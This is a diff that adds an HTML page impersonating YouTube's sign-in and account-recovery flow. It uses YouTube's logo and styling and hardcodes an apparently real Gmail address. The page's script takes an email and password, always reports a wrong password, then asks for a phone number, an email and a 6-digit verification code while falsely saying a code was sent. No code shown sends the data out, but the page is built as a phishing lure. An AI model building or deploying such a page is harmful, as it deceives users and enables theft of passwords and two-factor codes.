@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Account Recovery</title>
+    <style>
+        /* YouTube-inspired Styles */
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #030303;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 400px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: #ff0000;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .youtube-logo {
+            height: 40px;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        h1 {
+            color: #ff0000;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: #ff0000;
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #cc0000;
+        }
+
+        .btn:disabled {
+            background: #ff9999;
+            cursor: not-allowed;
+        }
+
+        .secondary-btn {
+            color: #065fd4;
+            text-align: center;
+            display: block;
+            margin-top: 20px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .error-message {
+            color: #d93025;
+            background: #fce8e6;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        /* Verification Options */
+        .option-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .option-card.selected {
+            border-color: #ff0000;
+            background: #fff0f0;
+        }
+
+        .option-icon {
+            width: 40px;
+            height: 40px;
+            background: #ffeeee;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: #ff0000;
+            font-size: 20px;
+        }
+
+        .option-text h3 {
+            margin: 0;
+            font-size: 16px;
+            color: #030303;
+        }
+
+        .option-text p {
+            margin: 5px 0 0;
+            font-size: 14px;
+            color: #606060;
+        }
+
+        /* Loading Screen */
+        .loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-bar {
+            width: 200px;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+            animation: load 2s ease-in-out infinite;
+        }
+
+        @keyframes load {
+            0% { width: 0%; margin-left: 0; }
+            50% { width: 100%; margin-left: 0; }
+            100% { width: 0%; margin-left: 100%; }
+        }
+
+        .loading-text {
+            color: #606060;
+            font-size: 14px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                width: 90%;
+                margin: 20px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-container" id="loadingScreen">
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+        <div class="loading-text">Securing your account...</div>
+    </div>
+
+    <!-- Login Page -->
+    <div class="container" id="loginPage">
+        <div class="header">
+            <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="youtube-logo" alt="YouTube">
+        </div>
+        <div class="content">
+            <h1>Sign in</h1>
+            
+            <div class="error-message" id="errorMessage">
+                Wrong password. Try again or click Forgot password to reset it.
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Email or phone" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            
+            <button class="btn" id="loginBtn" disabled onclick="attemptLogin()">Next</button>
+            
+            <a href="#" class="secondary-btn" onclick="showRecoveryPage()">Forgot password?</a>
+        </div>
+    </div>
+
+    <!-- Recovery Page -->
+    <div class="container" id="recoveryPage" style="display: none;">
+        <div class="header">
+            <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="youtube-logo" alt="YouTube">
+        </div>
+        <div class="content">
+            <h1>Account Recovery</h1>
+            <p style="text-align: center; color: #606060; margin-bottom: 25px;">Verify it's you to secure your account</p>
+            
+            <div style="background: #f5f5f5; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center;">
+                <div style="width: 40px; height: 40px; background: #ffebee; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px;">
+                    <span style="color: #ff0000;">👤</span>
+                </div>
+                <div>
+                    <div style="font-weight: 500;" id="recoveryEmail">jethabhoipure@gmail.com</div>
+                </div>
+            </div>
+            
+            <h3 style="font-size: 16px; margin-bottom: 15px;">Get verification code</h3>
+            
+            <div class="option-card" onclick="selectOption('sms')" id="smsOption">
+                <div class="option-icon">📱</div>
+                <div class="option-text">
+                    <h3>Text message (SMS)</h3>
+                    <p id="phoneDisplay">•••••••60</p>
+                </div>
+            </div>
+            
+            <div class="option-card" onclick="selectOption('email')" id="emailOption">
+                <div class="option-icon">✉️</div>
+                <div class="option-text">
+                    <h3>Email</h3>
+                    <p id="emailDisplay">j••••@gmail.com</p>
+                </div>
+            </div>
+            
+            <button class="btn" id="continueBtn" disabled onclick="verifySelection()">Continue</button>
+            
+            <a href="#" class="secondary-btn" onclick="goBackToLogin()">Try another way</a>
+        </div>
+    </div>
+
+    <!-- Phone Input Page -->
+    <div class="container" id="phoneInputPage" style="display: none;">
+        <div class="header">
+            <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="youtube-logo" alt="YouTube">
+        </div>
+        <div class="content">
+            <h1>Enter Phone Number</h1>
+            <p style="text-align: center; color: #606060; margin-bottom: 25px;">We'll text you a verification code</p>
+            
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" placeholder="Phone number" required>
+                <div style="color: #d93025; font-size: 12px; margin-top: 5px; display: none;" id="phoneError">Please enter a valid phone number</div>
+            </div>
+            
+            <button class="btn" id="phoneContinueBtn" disabled onclick="submitPhoneNumber()">Send Code</button>
+            
+            <a href="#" class="secondary-btn" onclick="goBackToRecovery()">Back</a>
+        </div>
+    </div>
+
+    <!-- Email Input Page -->
+    <div class="container" id="emailInputPage" style="display: none;">
+        <div class="header">
+            <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="youtube-logo" alt="YouTube">
+        </div>
+        <div class="content">
+            <h1>Enter Email</h1>
+            <p style="text-align: center; color: #606060; margin-bottom: 25px;">We'll email you a verification code</p>
+            
+            <div class="input-group">
+                <input type="email" id="newEmail" placeholder="Email address" required>
+                <div style="color: #d93025; font-size: 12px; margin-top: 5px; display: none;" id="emailError">Please enter a valid email address</div>
+            </div>
+            
+            <button class="btn" id="emailContinueBtn" disabled onclick="submitEmail()">Send Code</button>
+            
+            <a href="#" class="secondary-btn" onclick="goBackToRecovery()">Back</a>
+        </div>
+    </div>
+
+    <!-- Verification Page -->
+    <div class="container" id="verificationPage" style="display: none;">
+        <div class="header">
+            <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="youtube-logo" alt="YouTube">
+        </div>
+        <div class="content">
+            <h1>Enter Verification Code</h1>
+            <p style="text-align: center; color: #606060; margin-bottom: 25px;" id="verificationMessage">We sent a code to ••••••60</p>
+            
+            <div class="input-group">
+                <input type="text" id="verificationCode" placeholder="6-digit code" maxlength="6" required>
+                <div style="color: #d93025; font-size: 12px; margin-top: 5px; display: none;" id="codeError">Please enter a 6-digit code</div>
+            </div>
+            
+            <button class="btn" id="verifyBtn" disabled>Verify</button>
+            
+            <a href="#" class="secondary-btn">Resend code</a>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let selectedOption = null;
+        let loginAttempts = 0;
+        let userEnteredEmail = false;
+        let userEnteredPhone = false;
+        let phoneNumber = '';
+        let emailAddress = '';
+        
+        // Initialize form validation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Login page validation
+            document.getElementById('email').addEventListener('input', validateLoginForm);
+            document.getElementById('password').addEventListener('input', validateLoginForm);
+            
+            // Phone input validation
+            document.getElementById('phoneNumber').addEventListener('input', validatePhoneInput);
+            
+            // Email input validation
+            document.getElementById('newEmail').addEventListener('input', validateEmailInput);
+            
+            // Verification code validation
+            document.getElementById('verificationCode').addEventListener('input', validateVerificationCode);
+        });
+        
+        // Validate login form
+        function validateLoginForm() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            document.getElementById('loginBtn').disabled = !(email && password);
+        }
+        
+        // Validate phone input
+        function validatePhoneInput() {
+            const phone = document.getElementById('phoneNumber').value;
+            const isValid = phone.length >= 10;
+            document.getElementById('phoneContinueBtn').disabled = !isValid;
+            document.getElementById('phoneError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Validate email input
+        function validateEmailInput() {
+            const email = document.getElementById('newEmail').value;
+            const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            document.getElementById('emailContinueBtn').disabled = !isValid;
+            document.getElementById('emailError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Validate verification code
+        function validateVerificationCode() {
+            const code = document.getElementById('verificationCode').value;
+            const isValid = code.length === 6;
+            document.getElementById('verifyBtn').disabled = !isValid;
+            document.getElementById('codeError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Show loading screen with random delay
+        function showLoadingScreen() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            const randomDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+            
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    resolve();
+                }, randomDelay);
+            });
+        }
+        
+        // Show error message on login attempt
+        async function attemptLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) return;
+            
+            await showLoadingScreen();
+            
+            // Always show error message (for demo purposes)
+            document.getElementById('errorMessage').style.display = 'block';
+            
+            // Determine what user entered (email or phone)
+            userEnteredEmail = email.includes('@');
+            userEnteredPhone = !userEnteredEmail && /[0-9]/.test(email);
+            
+            // Store the entered contact info
+            if (userEnteredEmail) {
+                emailAddress = email;
+                document.getElementById('recoveryEmail').textContent = email;
+                const hiddenEmail = hideEmail(email);
+                document.getElementById('emailDisplay').textContent = hiddenEmail;
+            } 
+            
+            if (userEnteredPhone) {
+                phoneNumber = email;
+                const hiddenPhone = hidePhone(email);
+                document.getElementById('phoneDisplay').textContent = hiddenPhone;
+            }
+            
+            loginAttempts++;
+        }
+        
+        // Helper function to hide email
+        function hideEmail(email) {
+            const [name, domain] = email.split('@');
+            return name.charAt(0) + '••••@' + domain;
+        }
+        
+        // Helper function to hide phone
+        function hidePhone(phone) {
+            return phone.length > 3 ? 
+                '•••••••' + phone.slice(-3) : 
+                '•••••••' + phone;
+        }
+        
+        // Show recovery page
+        async function showRecoveryPage() {
+            await showLoadingScreen();
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('recoveryPage').style.display = 'block';
+        }
+        
+        // Go back to login page
+        async function goBackToLogin() {
+            await showLoadingScreen();
+            document.getElementById('recoveryPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+        
+        // Select verification option
+        function selectOption(option) {
+            selectedOption = option;
+            document.getElementById('smsOption').classList.remove('selected');
+            document.getElementById('emailOption').classList.remove('selected');
+            
+            if (option === 'sms') {
+                document.getElementById('smsOption').classList.add('selected');
+            } else {
+                document.getElementById('emailOption').classList.add('selected');
+            }
+            
+            document.getElementById('continueBtn').disabled = false;
+        }
+        
+        // Verify selection before proceeding
+        async function verifySelection() {
+            if (!selectedOption) return;
+            
+            await showLoadingScreen();
+            
+            if (selectedOption === 'sms' && !userEnteredPhone) {
+                // Show phone input page if they selected SMS but didn't provide phone
+                document.getElementById('recoveryPage').style.display = 'none';
+                document.getElementById('phoneInputPage').style.display = 'block';
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('phoneContinueBtn').disabled = true;
+            } 
+            else if (selectedOption === 'email' && !userEnteredEmail) {
+                // Show email input page if they selected email but didn't provide email
+                document.getElementById('recoveryPage').style.display = 'none';
+                document.getElementById('emailInputPage').style.display = 'block';
+                document.getElementById('newEmail').value = '';
+                document.getElementById('emailContinueBtn').disabled = true;
+            }
+            else {
+                // Proceed to verification page if they have the required info
+                showVerificationPage();
+                
+                // Update verification message based on selection
+                if (selectedOption === 'sms') {
+                    const displayPhone = phoneNumber ? hidePhone(phoneNumber) : document.getElementById('phoneDisplay').textContent;
+                    document.getElementById('verificationMessage').textContent = 
+                        "We sent a code to " + displayPhone;
+                } else {
+                    const displayEmail = emailAddress ? hideEmail(emailAddress) : document.getElementById('emailDisplay').textContent;
+                    document.getElementById('verificationMessage').textContent = 
+                        "We sent a code to " + displayEmail;
+                }
+            }
+        }
+        
+        // Submit phone number and proceed to verification
+        async function submitPhoneNumber() {
+            if (!validatePhoneInput()) return;
+            
+            await showLoadingScreen();
+            
+            phoneNumber = document.getElementById('phoneNumber').value;
+            if (phoneNumber) {
+                document.getElementById('phoneDisplay').textContent = hidePhone(phoneNumber);
+                document.getElementById('phoneInputPage').style.display = 'none';
+                showVerificationPage();
+                document.getElementById('verificationMessage').textContent = 
+                    "We sent a code to " + hidePhone(phoneNumber);
+            }
+        }
+        
+        // Submit email and proceed to verification
+        async function submitEmail() {
+            if (!validateEmailInput()) return;
+            
+            await showLoadingScreen();
+            
+            emailAddress = document.getElementById('newEmail').value;
+            if (emailAddress) {
+                document.getElementById('emailDisplay').textContent = hideEmail(emailAddress);
+                document.getElementById('emailInputPage').style.display = 'none';
+                showVerificationPage();
+                document.getElementById('verificationMessage').textContent = 
+                    "We sent a code to " + hideEmail(emailAddress);
+            }
+        }
+        
+        // Go back to recovery options
+        async function goBackToRecovery() {
+            await showLoadingScreen();
+            document.getElementById('phoneInputPage').style.display = 'none';
+            document.getElementById('emailInputPage').style.display = 'none';
+            document.getElementById('recoveryPage').style.display = 'block';
+        }
+        
+        // Show verification page
+        function showVerificationPage() {
+            document.getElementById('recoveryPage').style.display = 'none';
+            document.getElementById('phoneInputPage').style.display = 'none';
+            document.getElementById('emailInputPage').style.display = 'none';
+            document.getElementById('verificationPage').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
